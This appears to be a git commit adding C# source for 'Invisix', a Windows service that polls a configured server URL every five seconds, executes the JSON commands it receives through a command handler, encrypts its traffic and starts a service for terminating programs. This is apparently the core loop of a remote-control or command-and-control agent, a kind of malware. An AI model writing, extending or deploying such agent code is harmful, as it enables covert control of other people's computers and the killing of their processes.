c0d9f8a8b91a8e6eaf2fb15df96e6b007d6f3e16
HadiAgdam <hadiagdamdeveloper@gmail.com>
2024-10-02 13:08:43 +0330

    added Listener

---
+++ Listener.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
+
+
+namespace Invisix
+{
+    
+    class Listener
+    {
+
+        private HttpClient client;
+        private CommandHandler handler;
+        private Config config;
+
+
+        public Listener()
+        {
+            client = new HttpClient();
+            config = new Config();
+            EncryptionService.Init(config);
+
+            handler = new CommandHandler();
+            Log.r("Listener initiated");
+        }
+        
+        public async Task StartListening()
+        {
+            Log.r("start listening");
+            while (true)
+            {
+                try
+                {
+                    string response = await client.GetStringAsync(config.serverUrl);
+                    Log.r(response);
+                    Command cmd = JsonConvert.DeserializeObject<Command>(response);
+
+                    handler.Handle(cmd);
+                }
+                catch (Exception ex)
+                {
+                    Log.r(ex.ToString());
+                    Console.WriteLine(ex.ToString());
+                }
+                finally
+                {
+                    await Task.Delay(5000);
+                }
+            }
+        }
+    }
+}
---
+++ MainService.cs
@@ -0,0 +1,42 @@
+﻿using System.ServiceProcess;
+using System.Threading.Tasks;
+
+
+namespace Invisix
+{
+    public partial class MainService : ServiceBase
+    {
+        private Listener listener;
+        private TerminatorService terminator;
+
+
+        public MainService()
+        {
+
+
+        }
+
+
+        protected override async void OnStart(string[] args)
+        {
+
+            terminator = new TerminatorService();
+            terminator.start();
+            listener = new Listener();
+            await listener.StartListening();
+
+
+
+            // new Terminator().execute(new System.Collections.Generic.Dictionary<string, string> { { "program", "notepad" } });
+        }
+
+        protected override void OnStop()
+        {
+
+        }
+
+
+
+
+    }
+}
